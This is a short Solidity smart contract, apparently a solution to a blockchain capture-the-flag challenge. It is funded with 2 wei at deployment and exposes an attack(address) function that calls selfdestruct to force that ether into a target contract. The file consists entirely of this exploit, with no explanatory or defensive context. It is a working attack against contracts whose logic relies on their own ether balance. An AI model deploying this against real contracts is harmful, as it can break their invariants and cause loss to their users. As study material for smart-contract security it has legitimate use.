pragma solidity ^0.4.21;

contract transferToFiftyYears {
    
    function transferToFiftyYears() public payable {
        require (msg.value == 2 wei);
    }
    
    function attack(address target) public {
        selfdestruct(target);
    }
    
}